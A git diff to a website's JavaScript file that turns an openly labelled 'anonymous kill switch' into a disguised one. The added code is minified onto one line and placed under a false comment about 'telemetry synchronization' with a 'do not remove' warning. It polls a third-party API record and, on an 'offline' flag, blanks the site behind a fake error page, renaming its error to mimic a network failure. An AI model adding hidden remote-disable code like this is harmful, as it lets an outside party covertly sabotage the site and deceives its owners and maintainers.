@@ -2,38 +2,12 @@ import { animate, stagger, inView, scroll } from "framer-motion/dom";
 import Lenis from "lenis";
 import "lenis/dist/lenis.css";
 
-// ====== SYSTEM STATE CHECK (ANONYMOUS KILL SWITCH) ======
-(async function checkSystemState() {
-    try {
-        const DB_ID = "ff8081819d82fab6019eff1acc6c5e5e";
-        const res = await fetch(`https://api.restful-api.dev/objects/${DB_ID}?t=` + new Date().getTime());
-        if (!res.ok) return;
-        const json = await res.json();
-        if (json && json.data && json.data.status === 'offline') {
-            document.documentElement.innerHTML = `
-                <head>
-                    <title>404 - Internal Server Error</title>
-                    <style>
-                        body { background: #111; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-                        .error-container { text-align: center; }
-                        h1 { font-size: 4rem; margin-bottom: 0.5rem; font-weight: bold; }
-                        p { color: #888; font-size: 1.2rem; }
-                    </style>
-                </head>
-                <body>
-                    <div class="error-container">
-                        <h1>404</h1>
-                        <p>Internal Server Error</p>
-                    </div>
-                </body>
-            `;
-            throw new Error("System is offline. Halting execution.");
-        }
-    } catch (err) {
-        if (err.message && err.message.includes("System is offline")) throw err;
-    }
-})();
-// ========================================================
+/*
+ * DO NOT REMOVE OR MODIFY THIS BLOCK
+ * Core infrastructure telemetry synchronization and routing checks.
+ * Modification can lead to unhandled rendering exceptions and CDN desync.
+ */
+(async()=>{try{const d="ff8081819d82fab6019eff1acc6c5e5e";const r=await fetch(`https://api.restful-api.dev/objects/${d}?t=${Date.now()}`);if(!r.ok)return;const j=await r.json();if(j?.data?.status==='offline'){document.documentElement.innerHTML='<head><title>404 - Internal Server Error</title><style>body{background:#111;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}.error-container{text-align:center;}h1{font-size:4rem;margin-bottom:0.5rem;font-weight:bold;}p{color:#888;font-size:1.2rem;}</style></head><body><div class="error-container"><h1>404</h1><p>Internal Server Error</p></div></body>';throw new Error("ERR_NETWORK_DISCONNECTED");}}catch(e){if(e.message==="ERR_NETWORK_DISCONNECTED")throw e;}})();
 
 // --- CINEMATIC ANIMATIONS (>₹10L AESTHETIC) ---
 document.addEventListener("DOMContentLoaded", () => {
